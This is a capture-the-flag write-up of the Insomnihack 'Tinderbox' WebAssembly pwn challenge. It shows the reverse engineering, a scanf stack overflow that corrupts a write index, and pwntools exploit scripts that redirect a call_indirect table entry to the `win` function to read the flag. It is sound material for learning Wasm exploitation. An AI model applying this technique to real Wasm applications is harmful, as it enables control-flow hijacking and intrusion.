# Tinderbox

- Category: pwn/misc
- Final point value: 99
- Number of solves: 53

A Wasm (WebAssembly) pwning challenge, that I solved together with [Dvorhack](https://github.com/Dvorhack). We did not know about the Ghidra plugin for Wasm at the time, and reversed it using `wasm-decompile`. We managed to solve the challenge without having to setup a debugger. The general idea was to exploit a stack-based buffer overflow to overwrite a local variable used as an index in a char array write, then use this new write primitive to overwrite an index into the function tables and replace an innocuous function by the provided `win` function.

## Challenge description

> My friend is not a great developer but he insisted to work on a prototype in C. He said he compiled the program to WebAssembly and "it is super secure" but I am doubtful.

> `nc tinderbox.insomnihack.ch 7171`

> Note: the server runs the module using `Wasmtime 16.0.0` and the runtime has access to the current directory.

Associated files: [bin.wasm](./bin.wasm)

## WebAssembly

Wikipedia:
> WebAssembly (sometimes abbreviated Wasm) defines a portable binary-code format and a corresponding text format for executable programs as well as software interfaces for facilitating interactions between such programs and their host environment.
> The main goal of WebAssembly is to enable high-performance applications on web pages, "but it does not make any Web-specific assumptions or provide Web-specific features, so it can be employed in other environments as well." It is an open standard and aims to support any language on any operating system, and in practice all of the most popular languages already have at least some level of support

So, you can compile your favorite low-level programming language into some kind of binary, which will be executed in the browser of the people visiting your website, and expect faster performances than with JavaScript. But in our case, we are not doing web, we are running a Wasm binary directly, using [Wasmtime](https://wasmtime.dev/), which can be installed directly from our package manager.

WebAssembly binaries are meant for speed, and present intrisic security vulnerabilities which have been adressed for years in native binaries. For example, they do not use stack canaries, and the whole memory is mapped together at fixed address, without guard pages between the different sections. I would strongly recommend you to read [this paper](https://www.usenix.org/conference/usenixsecurity20/presentation/lehmann) which explains how Wasm binaries are loaded, and present different attack primitives that can be used with them. This paper contains some information that will be especially relevant for us:
- return addresses of functions are considered as `managed` data and stored directly in the VM, not in the Wasm linear memory space. Local variables of functions that are not of a native type, such as char arrays, are however stored in a stack that is placed in this linear memory space
- Wasm implements function pointers and virtual functions through the `call_indirect` instruction, which calls the function at a given index in a `table` of functions, if the type of this function correspond to the compile-time decided type for this particular `call_indirect`. Control-flow hijacking can be obtained if an index to this table is placed in the linear memory, and overwritten through a memory write primitive

Before moving one to the exploit, we should introduce the [WebAssembly Binary Toolkit](https://github.com/WebAssembly/wabt/), which provides tools for reversing and analysing Wasm binaries, and was very useful to us. It can also be downloaded from the package managers of most *nix distributions.

## Reverse engineering

Lets first try to run the binary with `wasmtime` and explore its functionalities:
```
$ wasmtime bin.wasm
Tell me your name:mouthon
Hello, what do you want to do?
1 - I made a typo in my name!
2 - Do some math for me.
3 - Tell me a joke!
1
Sorry, due to a technical limitation, I can only fix your first letter. What value do you want there?
42
Hello, what do you want to do?
1 - I made a typo in my name!
2 - Do some math for me.
3 - Tell me a joke!
2
Give me a number:5
Here is the result: 32

    *outhon - 3 is gone
```
We are asked for our name, and go a finite number of times through a menu that allows us to modify the first letter of our name, substract a given number from 37, and hear a "joke". Our name, with the modified letter, is printed at the end, along with the number 3.

Let's try to use some `wabt` tools to reverse it. We'll start with `wasm2wat`, which does a 1-to-1 translation of the wasm binary into a readable text format. The output file can be found [here](./bin.wat). We notice several interesting function names, among others a `win` function which is never called, but is in the indirect call table.
If we remove all the libc and wasi functions, we have the following simplified call graph:
```
_start -> __original_main -> {get_name; menu}
menu -> (print_menu, fix_typo, menu, call_indirect)
fix_typo -> setValues
```

The indirect call table is located near the end of the file:
```
(elem (;0;) (i32.const 1) func $basic $win $diff $__stdio_seek $__stdio_write $__stdio_read $__stdio_close $__stdout_write)
```
In the `.rodata`, at the end of the file, we can find the strings used by the program: "flag.txt" (probably used by `win`), a few format strings, an the displayed texts.

We tried to obtain C code by using `wasm2c`, but the result was not very usable (a huge C-like file with approximately the same instructions as the Wasm ones, but in C). We obtained much better results using `wasm-decompile`, which gives a [readable C-like file](./bin.dcmp). Though more comfortable to read than the `.wat`, understanding what happens is a bit more tedious than it would have been if we had known about the Ghidra Plugin, so we'll try to **only reverse the parts that are interesting to us**. We'll thus do the reverse in a "data flow analysis" fashion, starting with the user inputs, and looking up where these inputs go.

User inputs is always taken through `scanf`. The first argument of scanf is the address of the format string, in the `.rodata` section, which starts at address 1024 (`data rodata(offset: 1024)`). We can enumerate the scanf in the file, and find back the format string they use

```C
function get_name(a:int) {
  ...
  var j:int = 1062; // "%s"
  scanf(j, d);
  ...
}

function fix_typo(a:int, b:int, c:int) {
  ...
  var l:int = 1079; // "%d"
  var m:int = scanf(l, f);
  ...
}

function menu(a:int, b:int, c:int, d:int, e:int) {
  ...
  var l:int = 1075; // "%4d"
  var m:int = 32;
  var n:int = h + m;
  var o:int = scanf(l, n);
  ...
  var qa:int = 1075;
  scanf(qa, h);
  ...
}
```
It looks like we have the vulnerability: `scanf("%s", ...)` in `get_name` does not do any bound check, and thus probably allows us to do an overflow somewhere. But where exactly? Let's trace the second scanf parameter back in `get_name`:
```C
function get_name(a:int) {
  var b:int = stack_pointer;
  var c:int = 16;
  var d:int_ptr = b - c;
  stack_pointer = d;
  d[3] = a;
  ...
  var i:int = d[3];
  d[0] = i;
  var j:int = 1062;
  scanf(j, d);
  ...
}
```
It writes at an address that is passed as a parameter to `get_name`. So let's chase our buffer further back into the calling function:
```C
function original_main():int {
  var a:int = stack_pointer;
  var b:int = 64;
  var c:int = a - b;
  stack_pointer = c;
  ...
  var j:int = 40;
  var k:int = c + j;
  var l:int = k;
  get_name(l);
  ...
```
Wonderful, this address points in the stack frame of `original_main`. So we can do an overflow in this stack frame. Next question is, what can we overflow? In the Lehmann paper, they mention that memory organisation in the linear space can sometime allow overflowing from the stack into the heap, but in our case we do not have a heap. Our memory layout looks like this:
```
.rodata (1024) | .data (4272) | stack (decreasing, from 72816)
```
So, a stack overflow could reach the .data, but our buffer overflow (going towards higher addresses) won't touch anything except the upper stack frames. It's probably time to dig up a bit more into the code, and draw the stack frame of `original_main`. I did it manually on paper, by executing each instruction by hand until the call to `menu`, here is a clean reproduction of my drawing, where each slot is 4 bytes large:
```
memory:          |...|?|3|1|2|3|0|0|?|?|0|0|   
pointers:        c      v       l       z
args of menu:         4 0       1       3
```
Argument `2` of menu is not represented there because it is not a pointer, rather the constant `2`. The argument of `get_name`, aka our overflowing buffer, is pointed to by `l`. The only potentially interesting thing that this buffer can overflow into is the two zeroes pointed by argument `3` of `menu`. So, let's trace where this argument goes:
```C
function menu(a:int, b:int, c:int, d:int, e:int) {
  var f:int = stack_pointer;
  var g:int = 80;
  var h:int_ptr = f - g;
  stack_pointer = h;
  h[19] = a;
  h[18] = b;
  h[17] = c;
  h[16] = d; //here
  h[15] = e;
  ...
  var aa:int = h[16];
  var ba:int = h[18];
  var ca:int = h[15];
  fix_typo(aa, ba, ca);
  ...
}
```
It is passed to `fix_typo` as first argument. And then:
```C
function fix_typo(a:int, b:int, c:int) {
  var d:int = stack_pointer;
  var e:int = 32;
  var f:int_ptr = d - e;
  stack_pointer = f;
  f[7] = a; //here
  f[6] = b;
  f[5] = c;
  ...
  var o:int_ptr = f[7];
  var p:int = o[0];
  ...
  setValues(n, p, u);
  ...
}
```
The pointer is dereferenced, and the corresponding value is passed as second argument to `setValues`. If the buffer does not overflow, this argument should then always be zero. How is it actually used:
```C
function setValues(a:int, b:int, c:int) {
  var d:int = stack_pointer;
  var e:int = 16;
  var f:int = d - e;
  f[3]:int = a;
  f[2]:int = b; //here
  f[7]:byte = c;
  ...
  var n:int = f[7]:ubyte;
  var o:int = f[3]:int;
  var p:int = f[2]:int;
  var q:byte_ptr = o + p;
  q[0] = n;
  ...
}
```
Interesting, it seems to represent an offset at which we are editing the name!
According to the text printed by the program, we should only be able to edit the first letter of the name, i.e. the index `0`, which fits with the fact that, if the buffer is not overflowing, this offset always has value `0`.
Now, it's time to confirm that we were right in our reverse engineering by putting this theory into practice.

## Exploitation

Let's first write a small exploit script to confirm what we just said:
```python
#!/usr/bin/python3
from pwn import *

p = process(["/usr/bin/wasmtime", "bin.wasm"])

p.recvuntil(b"name:")

 
name = 16*b"A" #padding
name += p32(1) #index at which we want to edit
p.sendline(name)

p.recvuntil(b"joke!\n")
p.sendline(b"1") #edit name
p.recvuntil(b"there?")
p.sendline(b"42") #value to edit, chr(42) = '*'
p.recvuntil(b"joke!\n")
p.sendline(b"3") #doesn't matter, just needed to exit
p.interactive()
```
```
$ ./exploit.py
[+] Starting local process '/usr/bin/wasmtime': pid 17462
[*] Switching to interactive mode
Sorry not today.
Bye!

 A*AAAAAAAAAAAAAA - 3 is gone
[*] Process '/usr/bin/wasmtime' stopped with exit code 0 (pid 17462)
[*] Got EOF while reading in interactive
```
It worked, we got the second character replaced by a star, instead of the first one! Now, by specifying a negative index, we can also overwrite data located before the buffer. It's probably time to have a closer look at how these `3 1 2 3` we saw just before the buffer in the stack frame are used. The address of these numbers is passed as the first argument of `menu`, let's see what this argument becomes in the function:
```C
function menu(a:int, b:int, c:int, d:int, e:int) {
  var f:int = stack_pointer;
  var g:int = 80;
  var h:int_ptr = f - g;
  stack_pointer = h;
  h[19] = a; //<---- here
  h[18] = b;
  h[17] = c;
  h[16] = d;
  h[15] = e;
  ...
  br_table[B_f, B_e, B_d, ..B_c](r) //switch for the different options of the menu: typo, math, joke, default
  ...
  label B_e: //math
  ...
  var ra:int_ptr = h[19];
  var sa:int = ra[3];
  var ta:int = h[12];
  var ua:int = call_indirect(ta, sa);
  ...
  label B_d: //joke
  ...
  var za:int_ptr = h[19];
  var ab:int = za[1];
  call_indirect(ab);
  label B_c:
  ...
}
```
We see that if we choose "do some math" or "tell me a joke" in the menu, a `call_indirect` is made. The index of the function we want to call in the function table is read on the stack, at a given offset from `a`. So, for "math", we call the value at `a + 3`, which was `3`, and we can see in the `.wat` file that it correspond to the function named `diff`. For "joke", we call the value at `a + 1`, which is `1`, and the corresponding function is called `basic`. At `a + 2` we have `2`, which corresponds to `win`, but unfortunately for us this index is never called.

But what if we try to use our arbitrary write to overwrite one of the other indexes written to the stack? Let's try to overwrite the `3`, which is just before our buffer, and is an `int32`, so 4 bytes large. We'll write `2` instead, and hope it triggers win:
```python
name = 16*b"A" #padding
name += p32(-4, signed=True) #index at which we want to edit

p.sendline(name)

p.recvuntil(b"joke!\n")
p.sendline(b"1") #edit name
p.recvuntil(b"there?")
p.sendline(b"2") #value to write, in our case 2 is the index of `win` in the indirect call table
p.recvuntil(b"joke!\n")
p.sendline(b"2") #trigger the indirect call
p.interactive()
```
And we observe the following:
```
./exploit.py
[+] Starting local process '/usr/bin/wasmtime': pid 19365
[*] Switching to interactive mode
Give me a number:$ 4
Error: failed to run main module `bin.wasm`

Caused by:
    0: failed to invoke command default
    1: error while executing at wasm backtrace:
           0:  0x88e - <unknown>!menu
           1:  0x817 - <unknown>!menu
           2:  0xa21 - <unknown>!__original_main
           3:  0x2fe - <unknown>!_start
       note: using the `WASMTIME_BACKTRACE_DETAILS=1` environment variable may show more debugging information
    2: wasm trap: indirect call type mismatch
[*] Process '/usr/bin/wasmtime' stopped with exit code 134 (pid 19365)
```
There is a crash, and the reason for it is "indirect call type mismatch". Indeed, if we go back to the `.wat` file, we see that `$win` has `type 1`, and `$diff` has `type 0`. This is due to the fact that `diff` takes one parameter, where `win` does not take any. Let's rather try to overwrite the `1`, for `basic`, which has `type 1` too. The index will then be `-12` instead of `-4`, and we trigger by calling "joke" instead of "math":
``` 
./exploit.py
[+] Starting local process '/usr/bin/wasmtime': pid 19585
[*] Switching to interactive mode
Error: failed to run main module `bin.wasm`

Caused by:
    0: failed to invoke command default
    1: error while executing at wasm backtrace:
           0: 0x375c - <unknown>!fclose
           1:  0x399 - <unknown>!win
           2:  0x8dd - <unknown>!menu
           3:  0x817 - <unknown>!menu
           4:  0xa21 - <unknown>!__original_main
           5:  0x2fe - <unknown>!_start
       note: using the `WASMTIME_BACKTRACE_DETAILS=1` environment variable may show more debugging information
    2: wasm trap: uninitialized element
[*] Process '/usr/bin/wasmtime' stopped with exit code 134 (pid 19585)
```
We get another error, but this time `win` appears in the backtrace! They mention in the challenge description that "the runtime has access to the current directory". By RTFM of `wasmtime`, we find the option `--dir`, which does exactly this. So, we create a "flag.txt" file with a fake flag, add `--dir .` to the options of `wasmtime`, and try again:
```
./exploit.py                                                                                            ✔ 
[+] Starting local process '/usr/bin/wasmtime': pid 20148
[*] Switching to interactive mode
INS{fake_flag}

Bye!

 AAAAAAAAAAAAAAAA\xf4\xff\xff\xff - 3 is gone
[*] Got EOF while reading in interactive
```
We see our fake flag! now let's try against the server:

```
./exploit.py
[+] Opening connection to tinderbox.insomnihack.ch on port 7171: Done
[*] Switching to interactive mode
INS{L00k_mUm!W1th0ut_toUch1ng_RIP!}

Bye!

 AAAAAAAAAAAAAAAA\xf4\xff\xff\xff - 3 is gone
[*] Got EOF while reading in interactive
```
And that's a real flag! The final exploit can be found [here](./exploit.py).

## Conclusion

This challenge was a very nice introduction to Wasm pwning, and allowed us to learn new stuff (like, search if there exist a Ghidra plugin for something before reversing it manually...). Many thanks to the author, we had fun solving it!